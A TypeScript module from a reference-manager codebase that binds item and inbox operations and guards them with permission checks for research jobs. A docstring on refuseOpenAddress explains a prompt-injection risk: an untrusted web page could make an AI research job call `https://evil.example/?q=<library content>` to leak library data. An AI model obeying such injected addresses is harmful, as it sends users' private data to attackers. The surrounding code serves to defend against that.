import { detectIdentifier } from "@citegeist/metadata";
import {
  documentsConvert,
  documentsRead,
  inboxAccept,
  inboxReject,
  isScholarlyUrl,
  itemsAdd,
  itemsAttach,
  itemsFindFulltext,
  itemsMerge,
  itemsRename,
  itemsResolve,
  itemsRestore,
  itemsTrash,
  itemsUpdate,
  type Registry,
} from "@citegeist/ops";
import { CitegeistError } from "@citegeist/schema";
import { bindJobOperations } from "../jobs/index.js";
import type { Library } from "../library.js";
import { type IngestDeps, IngestService } from "./service.js";

export { parseDocMd, type ReadInput, type ReadResult, readDocument } from "./documents.js";
export { type DuplicateQuery, findDuplicate } from "./dupes.js";
export { rewriteWikiLinks } from "./items.js";
export {
  extractPdfText,
  guessHeader,
  type HeaderGuess,
  type PdfText,
  type PdfTextExtractor,
} from "./pdf-text.js";
export { type Lookup, mergeLookup, resolveItem } from "./resolve.js";
export {
  type AddInput,
  type AddResult,
  type IngestDeps,
  IngestService,
  type MetadataLookup,
} from "./service.js";
export {
  ChildProcessConvertWorker,
  type ChildProcessWorkerOptions,
  type ConvertCallOptions,
  type ConvertWorker,
  createStubWorker,
  STUB_WORKER_PATH,
  WorkerTransientError,
} from "./worker.js";

/** Refuses a call that would read a local file when the caller's token does not allow it. */
function refuseLocalFiles(what: string): never {
  throw new CitegeistError({
    code: "LOCAL_FILES_FORBIDDEN",
    message: `${what} reads a file on this Mac, which this session may not do`,
    fix: "Add the work by DOI, arXiv id, ISBN or the URL of a public page instead.",
    recovery: "fix-and-retry",
  });
}

/**
 * Refuses an address that a research job composed. Such a job reads untrusted web pages, so
 * a page could make it pass `https://evil.example/?q=<library content>` and let the core call it.
 * DOIs, arXiv ids, PMIDs, ISBNs, BibTeX and URLs on a scholarly host stay possible.
 */
function refuseOpenAddress(identifier: string): never {
  throw new CitegeistError({
    code: "RESEARCH_ADDRESS_FORBIDDEN",
    message: `items.add would open ${identifier.trim().slice(0, 120)}, an address outside the scholarly hosts, which a research job may not do`,
    fix: "Add the paper by its DOI or arXiv id. If the page names none, leave the paper out.",
    recovery: "fix-and-retry",
  });
}

/**
 * Binds items.add, items.attach, items.update, items.resolve, items.merge, items.rename, items.trash, inbox.accept, inbox.reject,
 * documents.read, documents.convert, jobs.get and jobs.list. Returns the service, which owns the
 * job queue and the conversion worker: call `service.close()` when the library closes.
 */
export function bindIngestOperations(
  registry: Registry,
  lib: Library,
  deps: IngestDeps,
): IngestService {
  const svc = new IngestService(lib, deps);
  bindJobOperations(registry, svc.queue);
  registry
    .bind(itemsAdd, async (ctx, input) => {
      if (input.citekey && ctx.egress === "scholarly") {
        throw new CitegeistError({
          code: "RESEARCH_REPAIR_FORBIDDEN",
          message: "a research job adds papers to the inbox; it does not change items",
          fix: "Call items.add with the DOI or arXiv id alone, without a citekey.",
          recovery: "fix-and-retry",
        });
      }
      const { identifier } = input;
      if (identifier === undefined) {
        if (!input.citekey || input.projects.length === 0) {
          throw new CitegeistError({
            code: "IDENTIFIER_MISSING",
            message: "items.add needs an identifier, or a citekey together with projects",
            fix: "Pass a DOI, arXiv id, ISBN, PMID, URL, BibTeX snippet or file path as identifier. To put an item that is in the library into projects, pass its citekey and projects.",
            recovery: "fix-and-retry",
          });
        }
        return svc.addToProjects(ctx.actor, input.citekey, input.projects);
      }
      if (ctx.localFiles === false && svc.namesLocalFile(identifier)) {
        refuseLocalFiles("items.add with this identifier");
      }
      if (ctx.egress === "scholarly") {
        const id = detectIdentifier(identifier);
        if (id?.kind === "url" && !isScholarlyUrl(id.value)) refuseOpenAddress(identifier);
      }
      // A research job lands in the inbox, whatever it asks for (docs/decisions/0014-agent-content-goes-to-inbox.md).
      return svc.addItem(
        ctx.actor,
        ctx.egress === "scholarly"
          ? { ...input, identifier, target: "inbox" }
          : { ...input, identifier },
      );
    })
    .bind(itemsAttach, async (ctx, input) => {
      if (ctx.localFiles === false) refuseLocalFiles("items.attach");
      return svc.attachFile(ctx.actor, input);
    })
    .bind(itemsFindFulltext, async (ctx, input) => svc.findFulltext(ctx.actor, input.citekey))
    .bind(itemsUpdate, async (ctx, input) => svc.updateItem(ctx.actor, input.citekey, input.patch))
    .bind(itemsResolve, async (ctx, input) =>
      svc.resolveItem(ctx.actor, input.citekey, input.identifier),
    )
    .bind(itemsMerge, async (ctx, input) => svc.mergeInboxItem(ctx.actor, input.from, input.into))
    .bind(itemsRename, async (ctx, input) => svc.renameItem(ctx.actor, input.citekey, input.to))
    .bind(itemsTrash, async (ctx, input) => {
      svc.trashItem(ctx.actor, input.citekey);
      return { ok: true as const };
    })
    .bind(itemsRestore, async (_ctx, input) => {
      svc.restoreItem(input.citekey);
      return { ok: true as const };
    })
    .bind(inboxAccept, async (ctx, input) => {
      svc.acceptInbox(ctx.actor, input.citekeys);
      return { ok: true as const };
    })
    .bind(inboxReject, async (ctx, input) => {
      svc.rejectInbox(input.citekeys, ctx.actor);
      return { ok: true as const };
    })
    .bind(documentsRead, async (_ctx, input) => svc.readDocument(input))
    .bind(documentsConvert, async (ctx, input) =>
      svc.convertItem(ctx.actor, input.citekey, input.force),
    );
  return svc;
}
